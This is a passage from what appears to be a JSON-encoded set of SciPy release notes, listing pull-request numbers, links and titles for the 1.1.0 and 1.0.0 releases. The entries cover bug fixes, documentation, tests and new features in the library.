<https://github.com/scipy/scipy/pull/8512>`__: MAINT: Move spline interpolation code to spline.c\n* `8513 <https://github.com/scipy/scipy/pull/8513>`__: TST: special: mark a slow test as xslow\n* `8514 <https://github.com/scipy/scipy/pull/8514>`__: CircleCI: Share data between jobs\n* `8515 <https://github.com/scipy/scipy/pull/8515>`__: ENH: special: improve accuracy of `zetac` for negative arguments\n* `8520 <https://github.com/scipy/scipy/pull/8520>`__: TST: Decrease the array sizes for two linalg tests\n* `8522 <https://github.com/scipy/scipy/pull/8522>`__: TST: special: restrict range of `test_besselk`/`test_besselk_int`\n* `8527 <https://github.com/scipy/scipy/pull/8527>`__: Documentation - example added for voronoi_plot_2d\n* `8528 <https://github.com/scipy/scipy/pull/8528>`__: DOC: Better, shared docstrings in ndimage\n* `8533 <https://github.com/scipy/scipy/pull/8533>`__: BUG: Fix PEP8 errors introduced in #8528.\n* `8534 <https://github.com/scipy/scipy/pull/8534>`__: ENH: Expose additional window functions\n* `8538 <https://github.com/scipy/scipy/pull/8538>`__: MAINT: Fix a couple mistakes in .pyf files.\n* `8540 <https://github.com/scipy/scipy/pull/8540>`__: ENH: interpolate: allow string aliases in make_interp_spline...\n* `8541 <https://github.com/scipy/scipy/pull/8541>`__: ENH: Cythonize peak_prominences\n* `8542 <https://github.com/scipy/scipy/pull/8542>`__: Remove numerical arguments from convolve2d / correlate2d\n* `8546 <https://github.com/scipy/scipy/pull/8546>`__: ENH: New arguments, documentation, and tests for ndimage.binary_opening\n* `8547 <https://github.com/scipy/scipy/pull/8547>`__: Giving both size and input now raises UserWarning (#7334)\n* `8549 <https://github.com/scipy/scipy/pull/8549>`__: DOC: stats: invweibull is also known as Frechet or type II extreme...\n* `8550 <https://github.com/scipy/scipy/pull/8550>`__: add cdf2rdf function\n* `8551 <https://github.com/scipy/scipy/pull/8551>`__: ENH: Port of most of the dd_real part of the qd high-precision...\n* `8553 <https://github.com/scipy/scipy/pull/8553>`__: Note in docs to address issue #3164.\n* `8554 <https://github.com/scipy/scipy/pull/8554>`__: ENH: stats: Use explicit MLE formulas in uniform.fit()\n* `8555 <https://github.com/scipy/scipy/pull/8555>`__: MAINT: adjust benchmark config\n* `8557 <https://github.com/scipy/scipy/pull/8557>`__: [DOC]: fix Nakagami density docstring\n* `8559 <https://github.com/scipy/scipy/pull/8559>`__: DOC: Fix docstring of diric(x, n)\n* `8563 <https://github.com/scipy/scipy/pull/8563>`__: [DOC]: fix gamma density docstring\n* `8564 <https://github.com/scipy/scipy/pull/8564>`__: BLD: change default Python version for doc build from 2.7 to...\n* `8568 <https://github.com/scipy/scipy/pull/8568>`__: BUG: Fixes Bland's Rule for pivot row/leaving variable, closes...\n* `8572 <https://github.com/scipy/scipy/pull/8572>`__: ENH: Add previous/next to interp1d\n* `8578 <https://github.com/scipy/scipy/pull/8578>`__: Example for linalg.eig()\n* `8580 <https://github.com/scipy/scipy/pull/8580>`__: DOC: update link to asv docs\n* `8584 <https://github.com/scipy/scipy/pull/8584>`__: filter_design: switch to explicit arguments, keeping None as...\n* `8586 <https://github.com/scipy/scipy/pull/8586>`__: DOC: stats: Add parentheses that were missing in the exponnorm...\n* `8587 <https://github.com/scipy/scipy/pull/8587>`__: TST: add benchmark for newton, secant, halley\n* `8588 <https://github.com/scipy/scipy/pull/8588>`__: DOC: special: Remove heaviside from \"functions not in special\"...\n* `8591 <https://github.com/scipy/scipy/pull/8591>`__: DOC: cdf2rdf Added version info and \"See also\"\n* `8594 <https://github.com/scipy/scipy/pull/8594>`__: ENH: Cythonize peak_widths\n* `8595 <https://github.com/scipy/scipy/pull/8595>`__: MAINT/ENH/BUG/TST: cdf2rdf: Address review comments made after...\n* `8597 <https://github.com/scipy/scipy/pull/8597>`__: DOC: add versionadded 1.1.0 for new keywords in ndimage.morphology\n* `8605 <https://github.com/scipy/scipy/pull/8605>`__: MAINT: special: improve implementations of `sinpi` and `cospi`\n* `8607 <https://github.com/scipy/scipy/pull/8607>`__: MAINT: add 2D benchmarks for convolve\n* `8608 <https://github.com/scipy/scipy/pull/8608>`__: FIX: Fix int check\n* `8613 <https://github.com/scipy/scipy/pull/8613>`__: fix typo in doc of signal.peak_widths\n* `8615 <https://github.com/scipy/scipy/pull/8615>`__: TST: fix failing linalg.qz float32 test by decreasing precision.\n* `8617 <https://github.com/scipy/scipy/pull/8617>`__: MAINT: clean up code in ellpj.c\n* `8618 <https://github.com/scipy/scipy/pull/8618>`__: add fsolve docs it doesn't handle over- or under-determined problems\n* `8620 <https://github.com/scipy/scipy/pull/8620>`__: DOC: add note on dtype attribute of aslinearoperator() argument\n* `8627 <https://github.com/scipy/scipy/pull/8627>`__: ENH: Add example 1D signal (ECG) to scipy.misc\n* `8630 <https://github.com/scipy/scipy/pull/8630>`__: ENH: Remove unnecessary copying in stats.percentileofscore\n* `8631 <https://github.com/scipy/scipy/pull/8631>`__: BLD: fix pdf doc build. closes gh-8076\n* `8633 <https://github.com/scipy/scipy/pull/8633>`__: BUG: fix regression in `io.netcdf_file` with append mode.\n* `8635 <https://github.com/scipy/scipy/pull/8635>`__: MAINT: remove spurious warning from (z)vode and lsoda. Closes...\n* `8636 <https://github.com/scipy/scipy/pull/8636>`__: BUG: sparse.linalg/gcrotmk: avoid rounding error in termination...\n* `8637 <https://github.com/scipy/scipy/pull/8637>`__: For pdf build\n* `8639 <https://github.com/scipy/scipy/pull/8639>`__: CI: build pdf documentation on circleci\n* `8640 <https://github.com/scipy/scipy/pull/8640>`__: TST: fix special test that was importing `np.testing.utils` (deprecated)\n* `8641 <https://github.com/scipy/scipy/pull/8641>`__: BUG: optimize: fixed sparse redundancy removal bug\n* `8645 <https://github.com/scipy/scipy/pull/8645>`__: BUG: modified sigmaclip to avoid clipping of constant input in...\n* `8647 <https://github.com/scipy/scipy/pull/8647>`__: TST: sparse: skip test_inplace_dense for numpy<1.13\n* `8657 <https://github.com/scipy/scipy/pull/8657>`__: Latex reduce left margins\n* `8659 <https://github.com/scipy/scipy/pull/8659>`__: TST: special: skip sign-of-zero test on 32-bit win32 with old...\n* `8661 <https://github.com/scipy/scipy/pull/8661>`__: Fix dblquad and tplquad not accepting float boundaries\n* `8666 <https://github.com/scipy/scipy/pull/8666>`__: DOC: fixes #8532\n* `8667 <https://github.com/scipy/scipy/pull/8667>`__: BUG: optimize: fixed issue #8663\n* `8668 <https://github.com/scipy/scipy/pull/8668>`__: Fix example in docstring of netcdf_file\n* `8671 <https://github.com/scipy/scipy/pull/8671>`__: DOC: Replace deprecated matplotlib kwarg\n* `8673 <https://github.com/scipy/scipy/pull/8673>`__: BUG: special: Use a stricter tolerance for the chndtr calculation.\n* `8674 <https://github.com/scipy/scipy/pull/8674>`__: ENH: In the Dirichlet distribution allow x_i to be 0 if alpha_i...\n* `8676 <https://github.com/scipy/scipy/pull/8676>`__: BUG: optimize: partial fix to linprog fails to detect infeasibility...\n* `8685 <https://github.com/scipy/scipy/pull/8685>`__: DOC: Add interp1d-next/previous example to tutorial\n* `8687 <https://github.com/scipy/scipy/pull/8687>`__: TST: netcdf: explicit mmap=True in test\n* `8688 <https://github.com/scipy/scipy/pull/8688>`__: BUG: signal, stats: use Python sum() instead of np.sum for summing...\n* `8689 <https://github.com/scipy/scipy/pull/8689>`__: TST: bump tolerances in tests\n* `8690 <https://github.com/scipy/scipy/pull/8690>`__: DEP: deprecate stats.itemfreq\n* `8691 <https://github.com/scipy/scipy/pull/8691>`__: BLD: special: fix build vs. dd_real.h package\n* `8695 <https://github.com/scipy/scipy/pull/8695>`__: DOC: Improve examples in signal.find_peaks with ECG signal\n* `8697 <https://github.com/scipy/scipy/pull/8697>`__: BUG: Fix `setup.py build install egg_info`, which did not previously...\n* `8704 <https://github.com/scipy/scipy/pull/8704>`__: TST: linalg: drop large size from solve() test\n* `8705 <https://github.com/scipy/scipy/pull/8705>`__: DOC: Describe signal.find_peaks and related functions behavior...\n* `8706 <https://github.com/scipy/scipy/pull/8706>`__: DOC: Specify encoding of rst file, remove an ambiguity in an...\n* `8710 <https://github.com/scipy/scipy/pull/8710>`__: MAINT: fix an import cycle sparse -> special -> integrate ->...\n* `8711 <https://github.com/scipy/scipy/pull/8711>`__: ENH: remove an avoidable overflow in scipy.stats.norminvgauss.pdf()\n* `8716 <https://github.com/scipy/scipy/pull/8716>`__: BUG: interpolate: allow list inputs for make_interp_spline(...,...\n* `8720 <https://github.com/scipy/scipy/pull/8720>`__: np.testing import that is compatible with numpy 1.15\n* `8724 <https://github.com/scipy/scipy/pull/8724>`__: CI: don't use pyproject.toml in the CI builds\n\n\n==========================\n", "1.0.0": "-----------------------\n\n- `4978 <https://github.com/scipy/scipy/pull/4978>`__: WIP: add pre_center and normalize options to lombscargle\n- `5796 <https://github.com/scipy/scipy/pull/5796>`__: TST: Remove all permanent filter changes from tests\n- `5910 <https://github.com/scipy/scipy/pull/5910>`__: ENH: sparse.linalg: add GCROT(m,k)\n- `6326 <https://github.com/scipy/scipy/pull/6326>`__: ENH: New ODE solvers\n- `6480 <https://github.com/scipy/scipy/pull/6480>`__: ENH: Make `signal.decimate` default to ``zero_phase=True``\n- `6705 <https://github.com/scipy/scipy/pull/6705>`__: ENH: add initial guess to sparse.linalg.lsqr\n- `6706 <https://github.com/scipy/scipy/pull/6706>`__: ENH: add initial guess to sparse.linalg.lsmr\n- `6769 <https://github.com/scipy/scipy/pull/6769>`__: BUG: optimize: add sufficient descent condition check to CG line...\n- `6855 <https://github.com/scipy/scipy/pull/6855>`__: Handle objects supporting PEP 519 in I/O functions\n- `6945 <https://github.com/scipy/scipy/pull/6945>`__: MAINT: ckdtree codebase clean up\n- `6953 <https://github.com/scipy/scipy/pull/6953>`__: DOC: add a SciPy Project Governance document\n- `6998 <https://github.com/scipy/scipy/pull/6998>`__: fix documentation of spearman rank corrcoef\n- `7017 <https://github.com/scipy/scipy/pull/7017>`__: ENH: add methods logcdf and cdf to ``scipy.stats.multivariate_normal``\n- `7027 <https://github.com/scipy/scipy/pull/7027>`__: Add random unitary matrices\n- `7030 <https://github.com/scipy/scipy/pull/7030>`__: ENH: Add strictly-increasing checks for x to 1D splines\n- `7031 <https://github.com/scipy/scipy/pull/7031>`__: BUG: Fix ``linear_sum_assignment`` hanging on an undefined matrix\n- `7041 <https://github.com/scipy/scipy/pull/7041>`__: DOC: Clairfy that windows are DFT-even by default\n- `7048 <https://github.com/scipy/scipy/pull/7048>`__: DOC: modified docs for ``find_peak_cwt``. Fixes #6922\n- `7056 <https://github.com/scipy/scipy/pull/7056>`__: Fix insufficient precision when calculating spearman/kendall...\n- `7057 <https://github.com/scipy/scipy/pull/7057>`__: MAINT: change dtype comparison in ``optimize.linear_sum_assignment``.\n- `7059 <https://github.com/scipy/scipy/pull/7059>`__: TST: make ``Xdist_deprecated_args`` cover all metrics\n- `7061 <https://github.com/scipy/scipy/pull/7061>`__: Fix msvc 9 and 10 compile errors\n- `7070 <https://github.com/scipy/scipy/pull/7070>`__: ENH: sparse: optimizing CSR/CSC slicing fast paths\n- `7078 <https://github.com/scipy/scipy/pull/7078>`__: ENH: sparse: defer ``sum_duplicates`` to csr/csc\n- `7079 <https://github.com/scipy/scipy/pull/7079>`__: ENH: sparse: allow subclasses to override specific math operations\n- `7081 <https://github.com/scipy/scipy/pull/7081>`__: ENH: sparse: speed up CSR/CSC toarray()\n- `7082 <https://github.com/scipy/scipy/pull/7082>`__: MAINT: Add missing ``PyType_Ready(&SuperLUGlobalType)`` for Py3\n- `7083 <https://github.com/scipy/scipy/pull/7083>`__: Corrected typo in the doc of scipy.linalg.lstsq()\n- `7086 <https://github.com/scipy/scipy/pull/7086>`__: Fix bug #7049 causing excessive slowness in ``expm_multiply``\n- `7088 <https://github.com/scipy/scipy/pull/7088>`__: Documented ``_argcheck`` for ``rv_discrete``\n- `7094 <https://github.com/scipy/scipy/pull/7094>`__: MAINT: Fix mistake in PR #7082\n- `7098 <https://github.com/scipy/scipy/pull/7098>`__: BF: return NULL from failed Py3 module check\n- `7105 <https://github.com/scipy/scipy/pull/7105>`__: MAINT: Customize ?TRSYL call in lyapunov solver\n- `7111 <https://github.com/scipy/scipy/pull/7111>`__: Fix error message typo in UnivariateSpline\n- `7113 <https://github.com/scipy/scipy/pull/7113>`__: FIX: Add add float to return type in documentation\n- `7119 <https://github.com/scipy/scipy/pull/7119>`__: ENH: sparse.linalg: remove ``_count_nonzero`` hack\n- `7123 <https://github.com/scipy/scipy/pull/7123>`__: ENH: added \"interior-point\" method for ``scipy.optimize.linprog``\n- `7137 <https://github.com/scipy/scipy/pull/7137>`__: DOC: clarify stats.linregress docstring, closes gh-7074\n- `7138 <https://github.com/scipy/scipy/pull/7138>`__: DOC: special: Add an example to the airy docstring.\n- `7139 <https://github.com/scipy/scipy/pull/7139>`__: DOC: stats: Update stats tutorial\n- `7142 <https://github.com/scipy/scipy/pull/7142>`__: BUG: special: prevent segfault in ``pbwa``\n- `7143 <https://github.com/scipy/scipy/pull/7143>`__: DOC: special: warn about alternate elliptic integral parameterizations\n- `7146 <https://github.com/scipy/scipy/pull/7146>`__: fix docstring of NearestNDInterpolator\n- `7148 <https://github.com/scipy/scipy/pull/7148>`__: DOC: special: Add Parameters, Returns and Examples to gamma docstring\n- `7152 <https://github.com/scipy/scipy/pull/7152>`__: MAINT: spatial: Remove two unused variables in ckdtree/src/distance.h\n- `7153 <https://github.com/scipy/scipy/pull/7153>`__: MAINT: special: remove deprecated variant of ``gammaln``\n- `7154 <https://github.com/scipy/scipy/pull/7154>`__: MAINT: Fix some code that generates C compiler warnings\n- `7155 <https://github.com/scipy/scipy/pull/7155>`__: DOC: linalg: Add examples for ``solve_banded`` and ``solve_triangular``\n- `7156 <https://github.com/scipy/scipy/pull/7156>`__: DOC: fix docstring of NearestNDInterpolator\n- `7159 <https://github.com/scipy/scipy/pull/7159>`__: BUG: special: fix sign of derivative when ``x < 0`` in ``pbwa``\n- `7161 <https://github.com/scipy/scipy/pull/7161>`__: MAINT: interpolate: make Rbf.A array a property\n- `7163 <https://github.com/scipy/scipy/pull/7163>`__: MAINT: special: return nan for inaccurate regions of ``pbwa``\n- `7165 <https://github.com/scipy/scipy/pull/7165>`__: ENH: optimize: changes to make BFGS implementation more efficient.\n- `7166 <https://github.com/scipy/scipy/pull/7166>`__: BUG: Prevent infinite loop in ``optimize._lsq.trf_linear.py``\n- `7173 <https://github.com/scipy/scipy/pull/7173>`__: BUG: sparse: return a numpy matrix from ``_add_dense``\n- `7179 <https://github.com/scipy/scipy/pull/7179>`__: DOC: Fix an error in sparse argmax docstring\n- `7180 <https://github.com/scipy/scipy/pull/7180>`__: MAINT: interpolate: A bit of clean up in ``interpolate/src/_interpolate.cpp``\n- `7182 <https://github.com/scipy/scipy/pull/7182>`__: Allow homogeneous coordinate transforms in ``affine_transform``\n- `7184 <https://github.com/scipy/scipy/pull/7184>`__: MAINT: Remove hack modifying a readonly attr\n- `7185 <https://github.com/scipy/scipy/pull/7185>`__: ENH: Add evaluation of periodic splines #6730\n- `7186 <https://github.com/scipy/scipy/pull/7186>`__: MAINT: PPoly: improve error messages for wrong shape/axis\n- `7187 <https://github.com/scipy/scipy/pull/7187>`__: DEP: interpolate: deprecate interpolate_wrapper\n- `7198 <https://github.com/scipy/scipy/pull/7198>`__: DOC: linalg: Add examples for ``solveh_banded`` and ``solve_toeplitz``.\n- `7200 <https://github.com/scipy/scipy/pull/7200>`__: DOC: stats: Added tutorial documentation for the generalized...\n- `7208 <https://github.com/scipy/scipy/pull/7208>`__: DOC: Added docstrings to ``issparse/isspmatrix(_...)`` methods and...\n- `7213 <https://github.com/scipy/scipy/pull/7213>`__: DOC: Added examples to circmean, circvar, circstd\n- `7215 <https://github.com/scipy/scipy/pull/7215>`__: DOC: Adding examples to scipy.sparse.linalg.... docstrings\n- `7223 <https://github.com/scipy/scipy/pull/7223>`__: DOC: special: Add examples for expit and logit.\n- `7224 <https://github.com/scipy/scipy/pull/7224>`__: BUG: interpolate: fix integer overflow in fitpack.bispev\n- `7225 <https://github.com/scipy/scipy/pull/7225>`__: DOC: update 1.0 release notes for several recent PRs.\n- `7226 <https://github.com/scipy/scipy/pull/7226>`__: MAINT: update docs and code for mailing list move to python.org\n- `7233 <https://github.com/scipy/scipy/pull/7233>`__: Fix issue #7232: Do not mask exceptions in objective func evaluation\n- `7234 <https://github.com/scipy/scipy/pull/7234>`__: MAINT: cluster: cleaning up VQ/k-means code\n- `7236 <https://github.com/scipy/scipy/pull/7236>`__: DOC: Fixed typo\n- `7238 <https://github.com/scipy/scipy/pull/7238>`__: BUG: fix syntaxerror due to unicode character in ``trustregion_exact``.\n- `7243 <https://github.com/scipy/scipy/pull/7243>`__: DOC: Update docstring in misc/pilutil.py\n- `7246 <https://github.com/scipy/scipy/pull/7246>`__: DEP: misc: deprecate imported names\n- `7249 <https://github.com/scipy/scipy/pull/7249>`__: DOC: Add plotted example to scipy.cluster.vq.kmeans\n- `7252 <https://github.com/scipy/scipy/pull/7252>`__: Fix 5231: docs of `factr`, `ftol` in sync w/ code\n- `7254 <https://github.com/scipy/scipy/pull/7254>`__: ENH: SphericalVoronoi Input Handling\n- `7256 <https://github.com/scipy/scipy/pull/7256>`__: fix for issue #7255 - Circular statistics functions give wrong...\n- `7263 <https://github.com/scipy/scipy/pull/7263>`__: CI: use python's faulthandler to ease tracing segfaults\n- `7288 <https://github.com/scipy/scipy/pull/7288>`__: ENH: linalg: add ``subspace_angles`` function.\n- `7290 <https://github.com/scipy/scipy/pull/7290>`__: BUG: stats: Fix spurious warnings in genextreme.\n- `7292 <https://github.com/scipy/scipy/pull/7292>`__: ENH: optimize: added trust region method trust-trlib\n- `7296 <https://github.com/scipy/scipy/pull/7296>`__: DOC: stats: Add an example to the ``ttest_ind_from_stats`` docstring.\n- `7297 <https://github.com/scipy/scipy/pull/7297>`__: DOC: signal: Add examples for ``chirp()`` and ``sweep_poly()``.\n- `7299 <https://github.com/scipy/scipy/pull/7299>`__: DOC: Made difference between brent and fminbound clearer\n- `7305 <https://github.com/scipy/scipy/pull/7305>`__: Simplify if-statements and constructor calls in ``integrate._ode``\n- `7309 <https://github.com/scipy/scipy/pull/7309>`__: Comply with PEP 518.\n- `7313 <https://github.com/scipy/scipy/pull/7313>`__: REL: add ``python_requires`` to setup.py, fix Python version check.\n- `7315 <https://github.com/scipy/scipy/pull/7315>`__: BUG: Fixed bug with Laguerre and Legendre polynomials\n- `7320 <https://github.com/scipy/scipy/pull/7320>`__: DOC: clarify meaning of flags in ode.integrate\n- `7333 <https://github.com/scipy/scipy/pull/7333>`__: DOC: Add examples to ``scipy.ndimage.gaussian_filter1d``\n- `7337 <https://github.com/scipy/scipy/pull/7337>`__: ENH: add n-dimensional DCT and IDCT to fftpack\n- `7353 <https://github.com/scipy/scipy/pull/7353>`__: Add ``_gels`` functions\n- `7357 <https://github.com/scipy/scipy/pull/7357>`__: DOC: linalg: Add examples to the svdvals docstring.\n- `7359 <https://github.com/scipy/scipy/pull/7359>`__: Bump Sphinx version to 1.5.5\n- `7361 <https://github.com/scipy/scipy/pull/7361>`__: DOC: linalg: Add some 'See Also' links among special matrices...\n- `7362 <https://github.com/scipy/scipy/pull/7362>`__: TST: Fix some Fedora 25 test failures.\n- `7363 <https://github.com/scipy/scipy/pull/7363>`__: DOC: linalg: tweak the docstring example of svd\n- `7365 <https://github.com/scipy/scipy/pull/7365>`__: MAINT: fix ``refguide_check.py`` for Sphinx >= 1.5\n- `7367 <https://github.com/scipy/scipy/pull/7367>`__: BUG: odrpack: fix invalid stride checks in ``d_lpkbls.f``\n- `7368 <https://github.com/scipy/scipy/pull/7368>`__: DOC: constants: Add examples to the 'find' docstring.\n- `7376 <https://github.com/scipy/scipy/pull/7376>`__: MAINT: bundle Mathjax with built docs\n- `7377 <https://github.com/scipy/scipy/pull/7377>`__: MAINT: optimize: Better name for trust-region-exact method.\n- `7378 <https://github.com/scipy/scipy/pull/7378>`__: Improve wording in tutorial\n- `7383 <https://github.com/scipy/scipy/pull/7383>`__: fix KroghInterpolator.derivatives failure with complex input\n- `7389 <https://github.com/scipy/scipy/pull/7389>`__: FIX: Copy mutable window in ``resample_poly``\n- `7390 <https://github.com/scipy/scipy/pull/7390>`__: DOC: optimize: A few tweaks of the examples in the ``curve_fit``\n- `7391 <https://github.com/scipy/scipy/pull/7391>`__: DOC: Add examples to scipy.stats\n- `7394 <https://github.com/scipy/scipy/pull/7394>`__: \"Weight\" is actually mass. Add slugs and slinches/blobs to mass\n- `7398 <https://github.com/scipy/scipy/pull/7398>`__: DOC: Correct minor typo in optimize.{brenth,brentq}\n- `7401 <https://github.com/scipy/scipy/pull/7401>`__: DOC: zeta only accepts real input\n- `7413 <https://github.com/scipy/scipy/pull/7413>`__: BUG: fix error messages in ``_minimize_trustregion_exact``\n- `7414 <https://github.com/scipy/scipy/pull/7414>`__: DOC: fix ``ndimage.distance_transform_bf`` docstring [ci skip]\n- `7415 <https://github.com/scipy/scipy/pull/7415>`__: DOC: fix skew docstring [ci skip]\n- `7423 <https://github.com/scipy/scipy/pull/7423>`__: Expand binnumbers with correct dimensions\n- `7431 <https://github.com/scipy/scipy/pull/7431>`__: BUG: Extend scipy.stats.arcsine.pdf to endpoints 0 and 1 #7427\n- `7432 <https://github.com/scipy/scipy/pull/7432>`__: DOC: Add examples to scipy.cluster.hierarchy\n- `7448 <https://github.com/scipy/scipy/pull/7448>`__: ENH: stats: Implement the survival function for pareto.\n- `7454 <https://github.com/scipy/scipy/pull/7454>`__: FIX Replaced ``np.assert_allclose`` with imported ``assert_allclose``\n- `7460 <https://github.com/scipy/scipy/pull/7460>`__: TST: fix integrate.ivp test that fails on 32-bit Python.\n- `7461 <https://github.com/scipy/scipy/pull/7461>`__: Doc: Added tutorial documentation for stats distributions ksone\n- `7463 <https://github.com/scipy/scipy/pull/7463>`__: DOC: Fix typos and remove trailing whitespace\n- `7465 <https://github.com/scipy/scipy/pull/7465>`__: Fix some ndimage.interpolation endianness bugs\n- `7468 <https://github.com/scipy/scipy/pull/7468>`__: del redundance in interpolate.py\n- `7470 <https://github.com/scipy/scipy/pull/7470>`__: Initialize \"info\" in ``minpack_lmdif``\n- `7478 <https://github.com/scipy/scipy/pull/7478>`__: Added more testing of smirnov/smirnovi functions\n- `7479 <https://github.com/scipy/scipy/pull/7479>`__: MAINT: update for new FutureWarning's in numpy 1.13.0\n- `7480 <https://github.com/scipy/scipy/pull/7480>`__: DOC: correctly describe output shape of dirichlet.mean() and...\n- `7482 <https://github.com/scipy/scipy/pull/7482>`__: signal.lti: Remove deprecated cross-system properties\n- `7484 <https://github.com/scipy/scipy/pull/7484>`__: MAINT: Clean-up uses of np.asarray in ndimage\n- `7485 <https://github.com/scipy/scipy/pull/7485>`__: ENH: support any order >=0 in ``ndimage.gaussian_filter``\n- `7486 <https://github.com/scipy/scipy/pull/7486>`__: ENH: Support k!=0 for sparse.diagonal()\n- `7498 <https://github.com/scipy/scipy/pull/7498>`__: BUG: sparse: pass assumeSortedIndices option to scikit.umfpack\n- `7501 <https://github.com/scipy/scipy/pull/7501>`__: ENH: add optimal leaf ordering for linkage matrices\n- `7506 <https://github.com/scipy/scipy/pull/7506>`__: MAINT: remove overflow in Metropolis fixes #7495\n- `7507 <https://github.com/scipy/scipy/pull/7507>`__: TST: speed up full test suite by less eval points in mpmath tests.\n- `7509 <https://github.com/scipy/scipy/pull/7509>`__: BUG: fix issue when using ``python setup.py somecommand --force``.\n- `7511 <https://github.com/scipy/scipy/pull/7511>`__: fix some alerts found with lgtm\n- `7514 <https://github.com/scipy/scipy/pull/7514>`__: Add explanation what the integer returned mean.\n- `7516 <https://github.com/scipy/scipy/pull/7516>`__: BUG: Fix roundoff errors in ``ndimage.uniform_filter1d``.\n- `7517 <https://github.com/scipy/scipy/pull/7517>`__: TST: fix signal.convolve test that was effectively being skipped.\n- `7523 <https://github.com/scipy/scipy/pull/7523>`__: ENH: linalg: allow lstsq to work with 0-shaped arrays\n- `7525 <https://github.com/scipy/scipy/pull/7525>`__: TST: Warning cleanup\n- `7526 <https://github.com/scipy/scipy/pull/7526>`__: DOC: params in ndimage.interpolation functions not optional\n- `7527 <https://github.com/scipy/scipy/pull/7527>`__: MAINT: Encapsulate error message handling in ``NI_LineBuffer``.\n- `7528 <https://github.com/scipy/scipy/pull/7528>`__: MAINT: Remove ndimage aliases for ``NPY_MAXDIMS``.\n- `7529 <https://github.com/scipy/scipy/pull/7529>`__: MAINT: Remove ``NI_(UN)LIKELY`` macros in favor of numpy ones.\n- `7537 <https://github.com/scipy/scipy/pull/7537>`__: MAINT: Use accessor function for numpy array internals\n- `7541 <https://github.com/scipy/scipy/pull/7541>`__: MAINT: Remove some uses of Numarray types in ndimage.\n- `7543 <https://github.com/scipy/scipy/pull/7543>`__: MAINT: Replace all NumarrayTypes uses in ``ni_fourier.c``\n- `7544 <https://github.com/scipy/scipy/pull/7544>`__: MAINT: Replace all uses of NumarrayTypes in ``ni_interpolation.c``\n- `7545 <https://github.com/scipy/scipy/pull/7545>`__: MAINT: Replace all uses of NumarrayTypes in ``ni_measure.c``\n- `7546 <https://github.com/scipy/scipy/pull/7546>`__: MAINT: Replace all uses of NumarrayTypes in ``ni_morphology.c``\n- `7548 <https://github.com/scipy/scipy/pull/7548>`__: DOC: make a note in benchmarks README on how to run without rebuilding.\n- `7549 <https://github.com/scipy/scipy/pull/7549>`__: MAINT: Get rid of NumarrayTypes.\n- `7552 <https://github.com/scipy/scipy/pull/7552>`__: TST: Fix new warnings -> error bugs found on OSX\n- `7554 <https://github.com/scipy/scipy/pull/7554>`__: Update superlu to 5.2.1 + fix stdint.h issue on MSVC\n- `7556 <https://github.com/scipy/scipy/pull/7556>`__: MAINT: Fix some types from #7549 + miscellaneous warnings.\n- `7558 <https://github.com/scipy/scipy/pull/7558>`__: MAINT: Use correct #define ``NO_IMPORT_ARRAY``, not ``NO_ARRAY_IMPORT``...\n- `7562 <https://github.com/scipy/scipy/pull/7562>`__: BUG: Copy ``import_nose`` from numpy.\n- `7563 <https://github.com/scipy/scipy/pull/7563>`__: ENH: Add the first Wasserstein and the Cram\u00e9r-von Mises statistical...\n- `7568 <https://github.com/scipy/scipy/pull/7568>`__: Test janitoring\n- `7571 <https://github.com/scipy/scipy/pull/7571>`__: Test janitoring pt. 2\n- `7572 <https://github.com/scipy/scipy/pull/7572>`__: Pytestifying\n- `7574 <https://github.com/scipy/scipy/pull/7574>`__: TST: Remove ignore warnings filters from stats\n- `7577 <https://github.com/scipy/scipy/pull/7577>`__: MAINT: Remove unused code in ``ndimage/ni_measure.c`` and .h\n- `7578 <https://github.com/scipy/scipy/pull/7578>`__: TST: Remove ignore warnings filters from sparse, clean up warning...\n- `7581 <https://github.com/scipy/scipy/pull/7581>`__: BUG: properly deallocate memory from ``PyArray_IntpConverter``.\n- `7582 <https://github.com/scipy/scipy/pull/7582>`__: DOC: signal tutorial: Typo in explanation of convolution\n- `7583 <https://github.com/scipy/scipy/pull/7583>`__: Remove remaining ignore warnings filters\n- `7586 <https://github.com/scipy/scipy/pull/7586>`__: DOC: add note to HACKING.rst on where to find build docs.\n- `7587 <https://github.com/scipy/scipy/pull/7587>`__: DOC: Add examples to scipy.optimize\n- `7594 <https://github.com/scipy/scipy/pull/7594>`__: TST: Add tests for ndimage converter functions.\n- `7596 <https://github.com/scipy/scipy/pull/7596>`__: Added a sanity check to ``signal.savgol_filter``\n- `7599 <https://github.com/scipy/scipy/pull/7599>`__: _upfirdn_apply stopping condition bugfix\n- `7601 <https://github.com/scipy/scipy/pull/7601>`__: MAINT: special: remove ``sph_jn`` et al.\n- `7602 <https://github.com/scipy/scipy/pull/7602>`__: TST: fix test failures in trimmed statistics tests with numpy...\n- `7605 <https://github.com/scipy/scipy/pull/7605>`__: Be clear about required dimension order\n- `7606 <https://github.com/scipy/scipy/pull/7606>`__: MAINT: Remove unused function ``NI_NormalizeType``.\n- `7607 <https://github.com/scipy/scipy/pull/7607>`__: TST: add osx to travis matrix\n- `7608 <https://github.com/scipy/scipy/pull/7608>`__: DOC: improve HACKING guide - mention reviewing PRs as contribution.\n- `7609 <https://github.com/scipy/scipy/pull/7609>`__: MAINT: Remove unnecessary warning filter by avoiding unnecessary...\n- `7610 <https://github.com/scipy/scipy/pull/7610>`__: #7557 : fix example code in periodogram\n- `7611 <https://github.com/scipy/scipy/pull/7611>`__: #7220 : fix TypeError while raising ValueError for invalid shape\n- `7612 <https://github.com/scipy/scipy/pull/7612>`__: Convert yield tests to pytest parametrized tests\n- `7613 <https://github.com/scipy/scipy/pull/7613>`__: Add distributor init file\n- `7614 <https://github.com/scipy/scipy/pull/7614>`__: fixup header\n- `7615 <https://github.com/scipy/scipy/pull/7615>`__: BUG: sparse: Fix assignment w/ non-canonical sparse argument\n- `7617 <https://github.com/scipy/scipy/pull/7617>`__: DOC: Clarify digital filter functions\n- `7619 <https://github.com/scipy/scipy/pull/7619>`__: ENH: scipy.sparse.spmatrix.astype: casting and copy parameter...\n- `7621 <https://github.com/scipy/scipy/pull/7621>`__: Expose VODE/ZVODE/LSODE IDID return code to user\n- `7622 <https://github.com/scipy/scipy/pull/7622>`__: MAINT: special: remove out-of-date comment for ``ellpk``\n- `7625 <https://github.com/scipy/scipy/pull/7625>`__: TST: Add a test for \"ignore\" warning filters\n- `7628 <https://github.com/scipy/scipy/pull/7628>`__: MAINT: refactoring and cleaning distance.py/.c/.h\n- `7629 <https://github.com/scipy/scipy/pull/7629>`__: DEP: deprecate args usage in xdist\n- `7630 <https://github.com/scipy/scipy/pull/7630>`__: ENH: weighted metrics\n- `7634 <https://github.com/scipy/scipy/pull/7634>`__: Follow-up to #6855\n- `7635 